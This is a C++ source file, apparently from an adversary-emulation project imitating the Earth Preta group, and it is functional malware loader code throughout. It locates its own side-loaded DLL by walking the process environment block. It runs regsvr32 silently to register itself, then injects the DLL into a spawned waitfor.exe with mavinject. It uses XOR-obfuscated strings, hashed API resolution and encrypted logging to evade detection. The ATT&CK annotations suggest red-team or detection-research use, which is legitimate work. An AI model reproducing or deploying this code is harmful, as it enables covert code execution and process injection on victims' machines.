#include "register.hpp"
#include "util.hpp"
#include "handler_util.hpp"
#include "obfuscation.hpp"

// Retrieve path of this module in memory.
// Since this module is used in DLL side-loading/hijacking, we know
// we won't be in the typical paths.
// Assumes path_buf holds up to MAX_PATH wide chars.
DWORD GetCurrModulePath(wchar_t* path_buf) {
    // Parse PE to get address to target DLL base
    PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    PPEB_LDR_DATA ldr_data = peb->Ldr;
    LIST_ENTRY* list_entry = ldr_data->InMemoryOrderModuleList.Flink;
    do {
        PLDR_DATA_TABLE_ENTRY1 peb_module_entry = CONTAINING_RECORD(list_entry, LDR_DATA_TABLE_ENTRY1, InMemoryOrderLinks);
        if (_wcsnicmp(peb_module_entry->BaseDllName.Buffer, XorStringW(WIDEN(TARGET_MODULE)), peb_module_entry->BaseDllName.Length / sizeof(wchar_t)) == 0) {
            // Make sure it's not the DLL in C:\Windows\System32 or C:\Windows\SysWOW64
            size_t full_path_len = peb_module_entry->FullDllName.Length / sizeof(wchar_t);
            if (_wcsnicmp(peb_module_entry->FullDllName.Buffer, XorStringW(WIDEN(TARGET_MODULE_SYS32)), full_path_len) == 0) {
                continue;
            } else if (_wcsnicmp(peb_module_entry->FullDllName.Buffer, XorStringW(WIDEN(TARGET_MODULE_SYSWOW)), full_path_len) == 0) {
                continue;
            }

            // Length field doesn't include null byte
            if (MAX_PATH < full_path_len + 1) {
                // Path too long
                continue;
            }
            wmemcpy(path_buf, peb_module_entry->FullDllName.Buffer, full_path_len);
            path_buf[full_path_len] = L'\0';
            return ERROR_SUCCESS;
        }

        // Iterate to next module. Final module will loop back to beginning of list.
        list_entry = list_entry->Flink;
    } while (list_entry != &(ldr_data->InMemoryOrderModuleList));

    return ERROR_MOD_NOT_FOUND;
}

/*
 * RegisterSelf:
 *      About:
 *          Creates a regsvr32.exe process to register this DLL, which will
 *          execute the exported DllRegisterServer function to continue the
 *          malicious routine.
 *      MITRE ATT&CK Techniques:
 *          T1218.010 System Binary Proxy Execution: Regsvr32
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html
 */
DWORD RegisterSelf(logger_ctx* log_ctx) {
    // Resolve additional APIs
    CreateProcessW_t fp_CreateProcessW = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), CreateProcessW);
    if (!fp_CreateProcessW) {
        AesLogger::LogError(log_ctx, XorString("Failed to resolve CreateProcessW API"));
        return FAIL_GET_CREATEPROCESSW;
    }
    GetLastError_t fp_GetLastError = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), GetLastError);
    if (!fp_GetLastError) {
        AesLogger::LogError(log_ctx, XorString("Failed to resolve GetLastError API"));
        return FAIL_GET_GETLASTERROR;
    }

    // Get current module path
    wchar_t dll_path[MAX_PATH];
    DWORD result = GetCurrModulePath(dll_path);
    if (result != ERROR_SUCCESS) {
        AesLogger::LogError(log_ctx, XorString("Failed to get current module path. Error code: %d"), result);
        return result;
    }

    // Spawn regsvr32 to register self
    STARTUPINFOW startup_info; // specify how to start process
    PROCESS_INFORMATION process_info; // to get the process ID
    ZeroMemory(&startup_info, sizeof(startup_info));
    ZeroMemory(&process_info, sizeof(process_info));
    startup_info.cb = sizeof(startup_info);
    wchar_t regsvr_cmd[256];
    _snwprintf(
        regsvr_cmd,
        256,
        XorStringW(L"C:\\Windows\\System32\\regsvr32.exe /s \"%s\""),
        dll_path
    );
    bool create_result = fp_CreateProcessW(
        NULL,
        regsvr_cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW, // dwCreationFlags
        NULL, // use environment of calling process
        NULL, // use current dir of calling process
        &startup_info,
        &process_info
    );
    if (!create_result) {
        result = fp_GetLastError();
        AesLogger::LogError(log_ctx, XorString("Failed to create regsvr32 process. Error code: %d"), result);
        return result;
    }

    AesLogger::LogInfo(log_ctx, XorString("Created regsvr32 process with PID %d."), process_info.dwProcessId);

    return ERROR_SUCCESS;
}


/*
 * DllRegisterServer:
 *      About:
 *          Exported function to be run by regsvr32.
 *          Spawns a waitfor.exe child process and injects this DLL into it
 *          using mavinject.
 *      MITRE ATT&CK Techniques:
 *          T1218.010 System Binary Proxy Execution: Regsvr32
 *          T1218.013 System Binary Proxy Execution: Mavinject
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html
 */
__declspec(dllexport) HRESULT WINAPI
DllRegisterServer() {
    shared_func_pointers fp;
    logger_ctx log_ctx;
    DWORD result;
    HRESULT hresult;

    // Resolve APIs
    result = ResolveSharedApis(&fp);
    if (result != ERROR_SUCCESS) {
        return result;
    }
    CreateProcessW_t fp_CreateProcessW = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), CreateProcessW);
    if (!fp_CreateProcessW) {
        return FAIL_GET_CREATEPROCESSW;
    }

    do {
        result = AesLogger::InitializeLogger(&fp, XorStringW(WIDEN(DLL_REG_LOG_FILE)), ENCRYPTED_LOGGING, &log_ctx);
        if (result != ERROR_SUCCESS) {
            hresult = __HRESULT_FROM_WIN32(result);
            break;
        }

        AesLogger::LogInfo(&log_ctx, XorString("======================================="));
        AesLogger::LogInfo(&log_ctx, XorString("Initialized DllRegisterServer() logger."));
        AesLogger::LogInfo(&log_ctx, XorString("======================================="));

        // Get current module path
        wchar_t dll_path[MAX_PATH];
        result = GetCurrModulePath(dll_path);
        if (result != ERROR_SUCCESS) {
            hresult = __HRESULT_FROM_WIN32(result);
            AesLogger::LogError(&log_ctx, XorString("Failed to get current module path. Error code: %d"), result);
            break;
        }

        // Spawn waitfor.exe
        AesLogger::LogDebug(&log_ctx, XorString("Spawning target waitfor.exe process."));
        STARTUPINFOW startup_info; // specify how to start process
        PROCESS_INFORMATION waitfor_process_info; // to get the process ID
        ZeroMemory(&startup_info, sizeof(startup_info));
        ZeroMemory(&waitfor_process_info, sizeof(waitfor_process_info));
        startup_info.cb = sizeof(startup_info);
        wchar_t* waitfor_cmd = XorStringW(L"C:\\Windows\\System32\\waitfor.exe Event183785251387");
        bool create_result = fp_CreateProcessW(
            NULL,
            waitfor_cmd,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW, // dwCreationFlags
            NULL, // use environment of calling process
            NULL, // use current dir of calling process
            &startup_info,
            &waitfor_process_info
        );
        if (!create_result) {
            result = fp.fp_GetLastError();
            hresult = __HRESULT_FROM_WIN32(result);
            AesLogger::LogError(&log_ctx, XorString("Failed to create process. Error code: %d"), result);
            break;
        }

        AesLogger::LogInfo(&log_ctx, XorString("Created waitfor process with PID %d."), waitfor_process_info.dwProcessId);

        // Spawn mavinject using waitfor PID
        AesLogger::LogDebug(&log_ctx, XorString("Spawning mavinject.exe process."));
        wchar_t mavinject_cmd[256];
        _snwprintf(
            mavinject_cmd,
            256,
            XorStringW(L"C:\\Windows\\System32\\mavinject.exe %d %s \"%s\""),
            waitfor_process_info.dwProcessId,
            XorStringW(L"/INJECTRUNNING"),
            dll_path
        );
        fp.fp_CloseHandle(waitfor_process_info.hProcess);
        fp.fp_CloseHandle(waitfor_process_info.hThread);

        PROCESS_INFORMATION mavinject_process_info;
        ZeroMemory(&mavinject_process_info, sizeof(mavinject_process_info));
        ZeroMemory(&startup_info, sizeof(startup_info));
        startup_info.cb = sizeof(startup_info);
        create_result = fp_CreateProcessW(
            NULL,
            mavinject_cmd,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW, // dwCreationFlags
            NULL, // use environment of calling process
            NULL, // use current dir of calling process
            &startup_info,
            &mavinject_process_info
        );

        if (!create_result) {
            result = fp.fp_GetLastError();
            hresult = __HRESULT_FROM_WIN32(result);
            AesLogger::LogError(&log_ctx, XorString("Failed to create process. Error code: %d"), result);
            break;
        } else {
            AesLogger::LogInfo(&log_ctx, XorString("Created mavinject process with PID %d."), mavinject_process_info.dwProcessId);
            fp.fp_CloseHandle(mavinject_process_info.hProcess);
            fp.fp_CloseHandle(mavinject_process_info.hThread);
            hresult = S_OK;
        }
    } while (false);

    AesLogger::CloseLogger(&log_ctx);
    return hresult;
}
